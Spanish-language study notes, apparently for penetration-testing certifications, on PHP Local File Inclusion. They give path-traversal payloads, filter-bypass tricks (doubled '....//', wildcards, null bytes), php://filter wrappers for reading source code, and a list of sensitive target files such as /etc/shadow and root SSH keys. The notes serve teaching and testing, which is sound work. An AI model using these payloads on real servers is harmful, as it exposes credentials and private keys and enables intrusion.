# Local File Inclusion
Es una vulnerabilidad que nos permite visualizar ficheros de la máquina victima a través del navegador web.
Cuando tenemos la opción de vulnerar un LFI  (ejemplo lo pongo después), nos podemos encontrar con restricciones. PHP, que utiliza funciones como ```include```, ```require```, ```include_once``` y ```require_once```, a menudo contribuye a que las aplicaciones web sean vulnerables.

## Sin restricción
Basta con poner el nombre del fichero que queremos leer

## Estando enjaulado en /var/www/html
Basta con volver a la raíz con '../'
```
../../../../..//etc/passwd
```

## Con '../' restringido

Pondriamos doble  '....//' ya que la sanitización eliminaría el primer '../' pero quedaría el segundo
```
....//....//....//....//etc/passwd
```

## Con cadenas de texto concretos restringidos

Si tenemos /etc/passwd restringido por ejemplo, podemos jugar con interrogantes, o incluso con barras o './'
```
....//....//....//....//?tc/p?sswd
....//....//....//....//etc///////////passwd
....//....//....//....//etc/./././passwd
```

Incluso si tenemos restringido, que los ultimos 6 caracteres conicidan con 'passwd'
```
....//....//....//....//etc/./././passwd/.
```
## Con forzado de extensiones
si el desarrollador concatena el $filename con por ejemplo .php, el fichero que buscaríamos sería /etc/passwd.php, cosa que no existe. para ello se puede para algunas versiones de PHP aplicar un null byte, con '%00' o '\0'

```
....//....//....//....//etc/passwd%00
....//....//....//....//etc/passwd\0
```


# Jugando con wrappers

Al navegar por un sitio web con php, en la url se hace referencia al fichero, por ejemplo index.php, o about.php. Lo que ocurre que si nos dirigimos a ese fichero, el propio servidor lo va a interpretar y cargará el sitio web.

Para ello jugaremos con un wrapper que nos convierte la petición al fichero php en base64, posteriormente inspeccionamos el código web con 'Clic derecho > inspeccionar'.  y buscamos la cadena en base64. 


Si nos fijamos ```page=courses ``` hace referencia a una página. es común que el código haga una concatenación con la extensión php. de manera que cuando pone page=courses, en realidad se está dirigiendo al fichero courses.php


<img src="https://raw.githubusercontent.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/main/images/lfi2.png" />

Teniendo esto claro, podemos jugar con el wrapper ```
```
php://filter/convert.base64-encode/resource=
```

<img src="https://raw.githubusercontent.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/main/images/lfi1.png" />

Así estamos accediendo al fichero index.php para ver su contenido. Algo que puede ser útil para visualizar por ejemplo un fichero php de conexión a base de datos, que debe incluir las credenciales de acceso.

también tenemos estos, que nos mostraría directamente el codigo php por pantalla:
```
php://filter/read=string.rot13/resource= 
```
y para descifrar esto, en bash:
```
tr '[c-za-bC-ZA-B]' '[p-za-oP-ZA-O]'
```


Otro ejemplo mas práctico:
```
php://filter/convert.iconv.utf8-utf16/resource=
```

-----------------------------
## Ficheros para testear
* /etc/profile controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived
* /proc/version specifies the version of the Linux kernel
* /etc/passwd has all registered user that has access to a system
* /etc/shadow contains information about the system's users' passwords
* /root/.bash_history contains the history commands for root user
* /var/mail/root all emails for root user
* /root/.ssh/id_rsa Private SSH keys for a root or any known valid user on the server
* /var/log/apache2/access.log the accessed requests for Apache  webserver
